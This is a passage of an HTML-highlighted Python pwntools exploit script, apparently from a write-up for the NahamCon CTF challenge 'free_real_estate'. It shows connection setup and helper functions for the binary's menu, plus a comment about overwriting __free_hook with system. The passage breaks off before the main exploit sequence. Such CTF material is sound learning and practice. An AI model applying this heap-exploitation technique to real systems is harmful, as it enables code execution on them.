</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">117
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">118
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">119
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">120
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">121
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">122
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">123
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">124
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">125
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">126
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">127
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">128
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">129
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">130
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">131
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">132
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">133
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">134
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">135
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">136
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">137
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">138
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">139
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">140
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">141
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">142
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">143
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">144
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">145
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">146
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">147
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">148
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">149
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">150
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">151
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">152
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">153
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">154
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">155
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">156
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">157
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">158
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">159
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">160
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">161
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">162
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">163
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">164
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">165
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">166
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">167
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">168
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">169
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">170
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">171
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">172
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">173
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">174
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">175
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">176
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">177
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">178
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">179
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">180
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">181
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">182
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">183
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">184
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">185
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">186
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">187
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">188
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">189
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">190
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">191
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">192
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">193
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">194
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">195
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">196
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">197
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">198
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">199
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">200
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">201
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">202
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">203
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">204
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">205
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">206
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">207
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">208
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">209
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">210
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">211
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">212
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">213
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">214
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">215
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> p64, u64, p32, u32
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./free_real_estate&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./libc-2.31.so&#34;</span>)
</span></span><span style="display:flex;"><span>ld <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./ld-2.31.so&#34;</span>)
</span></span><span style="display:flex;"><span>main_arena <span style="color:#555">=</span> <span style="color:#f60">0x1ecb80</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>binary <span style="color:#555">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#366">print</span>(args)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> args<span style="color:#555">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#555">=</span> process([exe<span style="color:#555">.</span>path])
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> args<span style="color:#555">.</span>PLT_DEBUG:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#555">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#555">=</span> remote(<span style="color:#c30">&#34;challenge.nahamcon.com&#34;</span>, <span style="color:#f60">32491</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">add_property</span>(r, lsn, sn, lc, comment<span style="color:#555">=</span><span style="color:#c30">&#39;&#39;</span>):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter the house number: &#39;</span>, <span style="color:#366">str</span>(<span style="color:#f60">10</span>)<span style="color:#555">.</span>encode()) <span style="color:#09f;font-style:italic"># Isn&#39;t useful. Just set any value.</span>
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;What is the length of the street name: &#39;</span>, <span style="color:#366">str</span>(lsn)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter the street name: &#39;</span>, sn)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;What is the price of the property?: &#39;</span>, <span style="color:#366">str</span>(<span style="color:#f60">10</span>)<span style="color:#555">.</span>encode()) <span style="color:#09f;font-style:italic"># Isn&#39;t useful. Just set any value.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> lc <span style="color:#555">==</span> <span style="color:#f60">0</span>:
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to add a comment for this property? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;n&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span>:
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to add a comment for this property? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;y&#39;</span>)
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;What is the length of the comment?: &#39;</span>, <span style="color:#366">str</span>(lc)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter the comment: &#39;</span>, comment)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">edit_property</span>(r, lsn, sn, lc, comment<span style="color:#555">=</span><span style="color:#c30">&#39;&#39;</span>, change_comment<span style="color:#555">=</span><span style="color:#069;font-weight:bold">False</span>, is_free_hook_overwritted<span style="color:#555">=</span><span style="color:#069;font-weight:bold">False</span>):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to change the house number? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;n&#39;</span>) <span style="color:#09f;font-style:italic"># Isn&#39;t useful. No need to edit.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> lsn <span style="color:#555">==</span> <span style="color:#f60">0</span>:
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to change the street? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;n&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span>:
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to change the street? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;y&#39;</span>)
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter the new street name length: &#39;</span>, <span style="color:#366">str</span>(lsn)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter the new street name: &#39;</span>, sn)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to change the price of the property? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;n&#39;</span>) <span style="color:#09f;font-style:italic"># Isn&#39;t useful. No need to edit.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> lc <span style="color:#555">==</span> <span style="color:#f60">0</span>:
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to change the comment? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;n&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> <span style="color:#000;font-weight:bold">not</span> change_comment:
</span></span><span style="display:flex;"><span>            r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to add a comment for this property? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;y&#39;</span>)
</span></span><span style="display:flex;"><span>            r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;What is the length of the comment?: &#39;</span>, <span style="color:#366">str</span>(lc)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>            r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter the comment: &#39;</span>, comment)
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">else</span>:
</span></span><span style="display:flex;"><span>            r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to change the comment? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;y&#39;</span>)
</span></span><span style="display:flex;"><span>            r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter the new comment length: &#39;</span>, <span style="color:#366">str</span>(lc)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">if</span> is_free_hook_overwritted:
</span></span><span style="display:flex;"><span>                <span style="color:#09f;font-style:italic"># No need to enter new comment, as we have overwritten it with system</span>
</span></span><span style="display:flex;"><span>                <span style="color:#069;font-weight:bold">return</span>
</span></span><span style="display:flex;"><span>            r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter the new comment: &#39;</span>, comment)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">remove_property</span>(r):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>
